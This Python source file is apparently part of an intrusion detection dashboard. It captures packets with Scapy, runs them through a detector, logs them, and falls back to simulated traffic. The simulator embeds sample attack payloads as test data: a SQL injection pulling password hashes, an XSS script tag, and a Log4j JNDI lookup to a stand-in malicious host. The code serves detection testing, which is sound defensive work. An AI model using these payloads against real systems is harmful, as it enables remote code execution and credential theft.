import threading
import time
import queue
import random
from datetime import datetime
from database import db, PacketLog, Alert
from detector import threat_detector
from config import Config

# Scapy import wrapped in try-except to prevent startup failure if Scapy itself has errors
try:
    from scapy.all import sniff, IP, TCP, UDP, ICMP, Raw
    SCAPY_AVAILABLE = True
except Exception as e:
    SCAPY_AVAILABLE = False
    print(f"[Sniffer] Scapy import failed or not configured: {e}")

class IntrusionDetectionSniffer:
    def __init__(self, flask_app):
        self.app = flask_app
        self.packet_queue = queue.Queue(maxsize=2000)
        self.running = False
        self.status = "Stopped"  # Stopped, Live, Simulated, Error
        
        # Threads
        self.capture_thread = None
        self.processor_thread = None
        
        # Stateful tracking for simulator
        self.simulator_ips = [
            "192.168.1.10", "192.168.1.25", "10.0.0.5", "10.0.0.12",  # Normal local IPs
            "185.190.140.22", "45.88.90.12", "192.0.2.144", "203.0.113.88" # Malicious IPs
        ]
        
        # Active alert broadcast callback (used to send live events to SSE frontend)
        self.alert_callback = None
        # Active packet broadcast callback
        self.packet_callback = None
        
        # Keep track of recent traffic rates
        self.src_rates = {} # {ip: [timestamps]}

    def set_callbacks(self, on_packet=None, on_alert=None):
        self.packet_callback = on_packet
        self.alert_callback = on_alert

    def start(self):
        if self.running:
            return
        
        self.running = True
        self.status = "Initializing"
        
        # Start the queue processor thread
        self.processor_thread = threading.Thread(target=self._process_queue, name="IDS-Processor")
        self.processor_thread.daemon = True
        self.processor_thread.start()
        
        # Try to start live Scapy sniffing
        if SCAPY_AVAILABLE:
            self.capture_thread = threading.Thread(target=self._live_sniff, name="IDS-LiveSniff")
            self.capture_thread.daemon = True
            self.capture_thread.start()
        else:
            self._start_simulation("Scapy Not Installed")

    def _start_simulation(self, reason):
        print(f"[Sniffer] Starting traffic simulation. Reason: {reason}")
        self.status = "Simulated"
        self.capture_thread = threading.Thread(target=self._run_simulation, name="IDS-Simulator")
        self.capture_thread.daemon = True
        self.capture_thread.start()

    def stop(self):
        self.running = False
        self.status = "Stopped"
        # Push sentinel to queue to unblock processor
        self.packet_queue.put(None)

    def _calculate_ip_rate(self, ip):
        """Estimate packet rate (PPS) for a given IP address."""
        now = datetime.utcnow()
        if ip not in self.src_rates:
            self.src_rates[ip] = []
        self.src_rates[ip].append(now)
        # Keep only the last 5 seconds
        self.src_rates[ip] = [t for t in self.src_rates[ip] if (now - t).total_seconds() <= 5]
        return len(self.src_rates[ip]) / 5.0

    def _live_sniff(self):
        print("[Sniffer] Attempting live packet capture...")
        try:
            # Test sniffing briefly to check for permissions
            sniff(count=1, timeout=1)
            self.status = "Live"
            
            def scapy_packet_handler(pkt):
                if not self.running:
                    return
                
                if IP in pkt:
                    src_ip = pkt[IP].src
                    dst_ip = pkt[IP].dst
                    
                    protocol = "OTHER"
                    src_port = None
                    dst_port = None
                    
                    if TCP in pkt:
                        protocol = "TCP"
                        src_port = pkt[TCP].sport
                        dst_port = pkt[TCP].dport
                    elif UDP in pkt:
                        protocol = "UDP"
                        src_port = pkt[UDP].sport
                        dst_port = pkt[UDP].dport
                    elif ICMP in pkt:
                        protocol = "ICMP"
                    
                    payload = ""
                    if Raw in pkt:
                        try:
                            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
                        except:
                            payload = str(pkt[Raw].load)
                            
                    packet_data = {
                        "src_ip": src_ip,
                        "dst_ip": dst_ip,
                        "protocol": protocol,
                        "src_port": src_port,
                        "dst_port": dst_port,
                        "length": len(pkt),
                        "payload_summary": payload[:500] if payload else ""
                    }
                    
                    try:
                        self.packet_queue.put(packet_data, block=False)
                    except queue.Full:
                        pass # Drop packets if queue is overloaded

            # Start infinite sniff loop
            sniff(prn=scapy_packet_handler, store=0)
            
        except Exception as e:
            self._start_simulation(f"Capture permissions denied or missing Npcap: {e}")

    def _process_queue(self):
        """Consumer thread processing packets and alerts in application context."""
        while self.running:
            try:
                packet_data = self.packet_queue.get()
                if packet_data is None:  # Stop signal
                    break
                
                with self.app.app_context():
                    # Compute dynamic metrics
                    src_ip = packet_data["src_ip"]
                    rate = self._calculate_ip_rate(src_ip)
                    
                    # 1. Run through Heuristic / Signature engine
                    alert_dict = threat_detector.analyze_packet(packet_data, rate, db.session)
                    
                    # 2. Log packet to database
                    classification = 'Normal'
                    if alert_dict:
                        classification = alert_dict['category']
                        
                    packet_log = PacketLog(
                        src_ip=packet_data["src_ip"],
                        dst_ip=packet_data["dst_ip"],
                        protocol=packet_data["protocol"],
                        src_port=packet_data["src_port"],
                        dst_port=packet_data["dst_port"],
                        length=packet_data["length"],
                        payload_summary=packet_data["payload_summary"][:200], # Keep DB records trim
                        classification=classification
                    )
                    db.session.add(packet_log)
                    
                    # 3. Save alert to database if triggered
                    alert_obj = None
                    if alert_dict:
                        alert_obj = Alert(
                            category=alert_dict["category"],
                            severity=alert_dict["severity"],
                            src_ip=alert_dict["src_ip"],
                            dst_ip=alert_dict["dst_ip"],
                            message=alert_dict["message"],
                            status="Active",
                            is_ml=alert_dict["is_ml"],
                            confidence=alert_dict["confidence"]
                        )
                        db.session.add(alert_obj)
                    
                    db.session.commit()
                    
                    # 4. Trigger SSE Real-time callbacks
                    if self.packet_callback:
                        self.packet_callback({
                            "id": packet_log.id,
                            "timestamp": datetime.utcnow().strftime('%H:%M:%S'),
                            "src_ip": packet_log.src_ip,
                            "dst_ip": packet_log.dst_ip,
                            "protocol": packet_log.protocol,
                            "src_port": packet_log.src_port,
                            "dst_port": packet_log.dst_port,
                            "length": packet_log.length,
                            "classification": packet_log.classification
                        })
                        
                    if alert_obj and self.alert_callback:
                        self.alert_callback({
                            "id": alert_obj.id,
                            "timestamp": alert_obj.timestamp.strftime('%H:%M:%S'),
                            "category": alert_obj.category,
                            "severity": alert_obj.severity,
                            "src_ip": alert_obj.src_ip,
                            "dst_ip": alert_obj.dst_ip,
                            "message": alert_obj.message,
                            "is_ml": alert_obj.is_ml,
                            "confidence": alert_obj.confidence
                        })
                        
            except Exception as e:
                print(f"[Sniffer] Queue processing error: {e}")
                # If DB is locked or we're in a thread without app context,
                # rollback may itself raise. Ignore rollback errors.
                try:
                    db.session.rollback()
                except Exception:
                    pass
            finally:
                self.packet_queue.task_done()

    def _run_simulation(self):
        """Generates realistic background traffic and periodic simulated attacks."""
        print("[Sniffer] Simulator thread started.")
        protocols = ["TCP", "UDP", "ICMP"]
        web_ports = [80, 443, 53, 123, 8080]
        
        attack_types = ["port_scan", "ddos", "sqli", "xss", "brute_force", "rce", "ml_anomaly"]
        last_attack_time = time.time()
        
        while self.running:
            try:
                current_time = time.time()
                
                # Check if it's time to run an attack (every 15-20 seconds to keep dashboard lively)
                if current_time - last_attack_time > random.randint(15, 20):
                    attack = random.choice(attack_types)
                    self._simulate_attack(attack)
                    last_attack_time = current_time
                    continue
                
                # Generate Normal Background Traffic
                src = random.choice(self.simulator_ips[:4]) # Select LAN IPs
                dst = "8.8.8.8" if random.random() > 0.5 else random.choice(self.simulator_ips[:4])
                if src == dst:
                    dst = "192.168.1.1" # gateway
                    
                protocol = random.choice(protocols)
                src_port = random.randint(30000, 60000)
                dst_port = random.choice(web_ports) if protocol != "ICMP" else None
                
                payloads = [
                    "GET /index.html HTTP/1.1\r\nHost: myportal.local\r\nConnection: keep-alive\r\n\r\n",
                    "GET /static/css/main.css HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                    "POST /api/metrics HTTP/1.1\r\nContent-Length: 15\r\n\r\n{'status':'ok'}",
                    "NTP time query",
                    "DNS Query: internal-service.local. IN A",
                    ""
                ]
                
                packet = {
                    "src_ip": src,
                    "dst_ip": dst,
                    "protocol": protocol,
                    "src_port": src_port,
                    "dst_port": dst_port,
                    "length": random.randint(64, 1200),
                    "payload_summary": random.choice(payloads)
                }
                
                self.packet_queue.put(packet)
                
                # Sleep briefly between background packets
                time.sleep(random.uniform(0.1, 0.4))
                
            except Exception as e:
                print(f"[Sniffer] Simulation loop error: {e}")
                time.sleep(1)

    def _simulate_attack(self, attack_type):
        """Push a burst of packets to the queue that trigger the detector logic."""
        print(f"[Sniffer] Simulating threat attack: {attack_type}")
        attacker_ip = "185.190.140.22" # Suspicious external IP
        victim_ip = "192.168.1.10"       # Local IP
        
        if attack_type == "port_scan":
            # Attacker hits 25 ports in rapid succession
            for port in range(20, 45):
                packet = {
                    "src_ip": attacker_ip,
                    "dst_ip": victim_ip,
                    "protocol": "TCP",
                    "src_port": random.randint(40000, 50000),
                    "dst_port": port,
                    "length": 40,  # Tiny SYN packet
                    "payload_summary": ""
                }
                self.packet_queue.put(packet)
                time.sleep(0.01)
                
        elif attack_type == "ddos":
            # Flooder sends 120 packets to port 80 very quickly
            flooder_ip = "45.88.90.12"
            for _ in range(120):
                packet = {
                    "src_ip": flooder_ip,
                    "dst_ip": victim_ip,
                    "protocol": "TCP",
                    "src_port": random.randint(1024, 65535),
                    "dst_port": 80,
                    "length": 64,
                    "payload_summary": "DDoS GET / HTTP/1.1"
                }
                self.packet_queue.put(packet)
                # No sleep (sends instantly)
                
        elif attack_type == "sqli":
            # SQL Injection payload
            packet = {
                "src_ip": attacker_ip,
                "dst_ip": victim_ip,
                "protocol": "TCP",
                "src_port": random.randint(30000, 60000),
                "dst_port": 80,
                "length": 250,
                "payload_summary": "GET /products?id=1%20UNION%20SELECT%20username,%20password_hash%20FROM%20users%20-- HTTP/1.1\r\nHost: target.lan\r\n\r\n"
            }
            self.packet_queue.put(packet)
            
        elif attack_type == "xss":
            # Cross site scripting payload
            packet = {
                "src_ip": attacker_ip,
                "dst_ip": victim_ip,
                "protocol": "TCP",
                "src_port": random.randint(30000, 60000),
                "dst_port": 443,
                "length": 320,
                "payload_summary": "POST /feedback HTTP/1.1\r\nHost: target.lan\r\n\r\ncomment=<script>alert('XSS_Exploit')</script>&submit=1"
            }
            self.packet_queue.put(packet)
            
        elif attack_type == "brute_force":
            # Rapid connections to port 22 (SSH)
            bf_ip = "192.0.2.144" # Pre-blacklisted IP too
            for _ in range(10):
                packet = {
                    "src_ip": bf_ip,
                    "dst_ip": victim_ip,
                    "protocol": "TCP",
                    "src_port": random.randint(35000, 36000),
                    "dst_port": 22,
                    "length": 60,
                    "payload_summary": "SSH-2.0-OpenSSH_8.4p1 Ubuntu-5ubuntu1"
                }
                self.packet_queue.put(packet)
                time.sleep(0.05)
                
        elif attack_type == "rce":
            # Log4j RCE exploit string
            packet = {
                "src_ip": attacker_ip,
                "dst_ip": victim_ip,
                "protocol": "TCP",
                "src_port": random.randint(30000, 60000),
                "dst_port": 8080,
                "length": 450,
                "payload_summary": "GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://malicious-server.xyz:1389/Exploit}\r\nHost: internal-service.local\r\n\r\n"
            }
            self.packet_queue.put(packet)

        elif attack_type == "ml_anomaly":
            # ML Anomaly: abnormal protocol metrics, high-entropy content
            # e.g., massive payload size on unusual port (9999), encrypted C2 beacon behavior
            packet = {
                "src_ip": "203.0.113.88",
                "dst_ip": victim_ip,
                "protocol": "TCP",
                "src_port": 9999,
                "dst_port": 4444,
                "length": 1450,
                # Random looking characters (high entropy payload)
                "payload_summary": "C2Beacon: " + "".join(chr(random.randint(33, 126)) for _ in range(150))
            }
            self.packet_queue.put(packet)
